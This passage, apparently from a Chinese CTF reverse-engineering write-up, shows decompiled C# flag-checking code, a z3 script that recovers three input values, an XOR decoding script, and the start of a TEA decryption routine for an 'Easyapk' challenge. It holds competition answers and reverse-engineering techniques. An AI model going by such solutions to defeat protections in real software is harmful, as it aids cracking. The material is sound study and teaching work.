            &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] array3 = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;];
            &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] array4 = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;];
            &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] first = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] { 
                &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;213&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, 
                &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;173&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;189&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;198&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;166&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;140&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;183&lt;/span&gt;, 
                &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;247&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;223&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;145&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, 
                &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;191&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;179&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;227&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, 
                &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
            };
            &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] array5 = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] {
                &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;251&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;167&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;, 
                &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;245&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;207&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;223&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;, 
                &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;251&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;227&lt;/span&gt;
            };
            array[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] = num;
            array[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] = num2;
            array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] = num3;
            T1.Check1(array[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], array[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], array2);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; flag2 = first.SequenceEqual(array2);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (flag2)
            {
                T1.ParseKey(array, array4);
                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &amp;lt; array5.Length; i++)
                {
                    array5[i] ^= array4[i % array4.Length];
                }
                MessageBox.Show(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag{&amp;#34;&lt;/span&gt; + Encoding.Default.GetString(array5) + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congratulations!&amp;#34;&lt;/span&gt;, MessageBoxButtons.OK);
            }
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception)
    {
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用 z3 求解三个环境变量&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)
y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)
z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)

flag1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;213&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;173&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;189&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;198&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;166&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;140&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;183&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;247&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;223&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;145&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;191&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;179&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;227&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
]

s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;320&lt;/span&gt;):
    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    cur &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((((z &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; ((y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(cur &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (flag1[i &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sat:
    m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
    print (m)
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no res&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;求解，或动调改内存&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;array &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;156324965&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;868387187&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3131229747&lt;/span&gt;]
Key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;):
        Key[i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (array[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (j &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;

print (Key)
cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;251&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;167&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;245&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;207&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;223&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;251&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;227&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(cipher)):
    print (chr(cipher[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; Key[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; len(Key)]), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;easyapk&#34;&gt;Easyapk&lt;/h2&gt;
&lt;p&gt;逻辑在 so 层，有大量的垃圾指令，实际逻辑是先进行 rot13，再进行 tea 加密
解密脚本如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;//解密函数  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k) {  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], v1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sum&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xC6EF3720&lt;/span&gt;, i;  &lt;span style=&#34;color:#75715e&#34;&gt;/* set up */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; delta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9e3779b9&lt;/span&gt;;                     &lt;span style=&#34;color:#75715e&#34;&gt;/* a key schedule constant */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; k0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], k1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], k2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], k3&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];   &lt;span style=&#34;color:#75715e&#34;&gt;/* cache key */&lt;/span&gt;  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {                         &lt;span style=&#34;color:#75715e&#34;&gt;/* basic cycle start */&lt;/span&gt;  
        v1 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k2) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k3);  
